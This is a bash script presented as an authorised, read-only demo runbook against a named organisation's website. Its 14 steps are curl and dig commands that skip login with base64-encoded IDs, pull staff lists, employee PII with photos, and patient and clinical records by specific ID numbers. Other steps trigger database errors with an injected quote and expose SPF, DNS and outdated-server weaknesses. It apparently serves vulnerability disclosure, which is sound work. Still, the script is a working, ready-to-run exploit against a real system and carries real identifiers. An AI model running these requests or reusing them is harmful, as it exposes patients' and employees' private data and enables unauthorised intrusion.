#!/bin/bash
# =============================================================================
#  LIVE DEMO RUNBOOK — narayanagroup.co.in
#  Attacker's-perspective walkthrough for the security & developer teams.
#
#  RULES:
#    * READ-ONLY. Every command below is a GET (or a DNS lookup).
#    * Do NOT POST anything that changes state (no uploads, no PIN changes,
#      no bill-cancellation approvals) — on stage or off.
#    * Nothing here downloads, modifies, deletes or stores target data.
#    * Stop immediately if anything behaves unexpectedly.
#
#  Usage:   chmod +x LIVE-DEMO-RUNBOOK.sh && ./LIVE-DEMO-RUNBOOK.sh
#  (press Enter to advance step by step; Ctrl+C to abort)
# =============================================================================

T="https://narayanagroup.co.in"

say() { echo; echo "────────────────────────────────────────────────────────────"; \
        echo "  $1"; echo "────────────────────────────────────────────────────────────"; \
        read -r -p "  [ press ENTER ]"; }

clear
echo "  LIVE DEMO — narayanagroup.co.in"
echo "  Read-only. Authorised. Non-destructive."
echo "  $T"
echo
read -r -p "  Press ENTER to begin (Ctrl+C to abort)..."

# ---------------------------------------------------------------- 01
say "01 — Does the login actually create a session?"
echo "  Expected: NOTHING. A real login sets a cookie. This one does not."
echo
curl -s -i "$T/Nnote/index.html" | grep -i "set-cookie"
echo "  (end of output)"

# ---------------------------------------------------------------- 02
say "02 — The 'secret' identity in the URL is just base64."
echo "  Expected: MzMzNDAyNA==   (= employee 3334024)"
echo
echo -n "3334024" | base64
echo -n "1005411787" | base64

# ---------------------------------------------------------------- 03
say "03 — Skip the login page entirely.  *** THE MONEY SHOT ***"
echo "  Expected: 200   (a working system would return 401/403 or redirect)"
echo
echo -n "  /Nnote/layout.html?empid=MzMzNDAyNA==  -> "
curl -s -o /dev/null -w "%{http_code}\n" "$T/Nnote/layout.html?empid=MzMzNDAyNA=="
echo -n "  /ncare/layout.html?regno=...           -> "
curl -s -o /dev/null -w "%{http_code}\n" "$T/ncare/layout.html?regno=MTAwNTQxMTc4Nw=="

# ---------------------------------------------------------------- 04
say "04 — Ask for a staff list. No login, no cookie, no token."
echo "  Expected: real employee names and IDs"
echo
curl -s "$T/NnoteApi/api/Nnote/Assignee/1"
echo

# ---------------------------------------------------------------- 05
say "05 — Confirm a staff number is real (username enumeration)."
echo "  Expected: {\"data\":\"Success\"}"
echo
curl -s "$T/NtraktApi/api/CheckOperator/3334024"
echo

# ---------------------------------------------------------------- 06
say "06 — Pull a FULL employee record: PII + scanned photograph."
echo "  Expected: name, mobile, DOB, department, branch, Base64 JPEG"
echo "  (truncated to 900 chars on screen)"
echo
curl -s "$T/NtraktApi/api/User/Info/3334024" | head -c 900
echo
echo "  ..."

# ---------------------------------------------------------------- 07
say "07 — The bill-cancellation queue leaks patient registration numbers."
echo "  Expected: real Prno values"
echo
curl -s "$T/NnoteApi/api/Investigation/Cancel/Approval/List" | head -c 600
echo

# ---------------------------------------------------------------- 08
say "08 — Pull a live PATIENT record.  *** MOST SERIOUS ***"
echo "  Expected: name, age, gender, mobile number"
echo
curl -s "$T/NnoteApi/api/Patient/Info/1005411787"
echo

# ---------------------------------------------------------------- 09
say "09 — Pull the CLINICAL TEST for that patient."
echo "  Expected: test name + charges"
echo
curl -s "$T/NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001"
echo

# ---------------------------------------------------------------- 10
say "10 — Error messages leak the database, schema and file paths."
echo "  Expected: ORA-01722 + MOBIDB + d:\\NtraktApi\\..."
echo
curl -s "$T/NtraktApi/api/User/Info/1'" | head -c 700
echo

# ---------------------------------------------------------------- 11
say "11 — Can anyone send email as you? (SPF)"
echo "  Expected: EMPTY  = email can be forged in your name"
echo
dig +short TXT narayanagroup.co.in
echo "  (end of output)"

# ---------------------------------------------------------------- 12
say "12 — The DNS typo."
echo "  Expected: 15.241.194.25  — every other address starts with 115."
echo "            This subdomain points at somebody else's server."
echo
dig +short online.narayanagroup.co.in

# ---------------------------------------------------------------- 13
say "13 — What the payment page sends to every visitor."
echo "  Look for: hinamount, hdnfineamt, hinaccountno  (all editable in the browser)"
echo
curl -s "$T/onlinefeepay/razorpay/CreateOrderNew.aspx" \
  | grep -o 'name="hin[a-zA-Z]*"[^>]*' | head -n 6
echo "  (end of output)"

# ---------------------------------------------------------------- 14
say "14 — End-of-life software, announced by the servers themselves."
echo "  Expected: PHP 5.6.25 / Apache 2.4.23 / PHP 7.3.11 — all unsupported"
echo
curl -s -I "http://helpdesk.narayanagroup.co.in/helpdesk/" | grep -iE "^(server|x-powered-by)"
curl -s -I -L "https://uat.narayanagroup.co.in/" | grep -i "^server"

# ---------------------------------------------------------------- END
echo
echo "────────────────────────────────────────────────────────────"
echo "  END OF DEMO — 14 steps, all read-only."
echo
echo "  The fix: server-side authentication on /NtraktApi/api/* and"
echo "           /NnoteApi/api/*, deny by default. One day of work."
echo "────────────────────────────────────────────────────────────"
echo
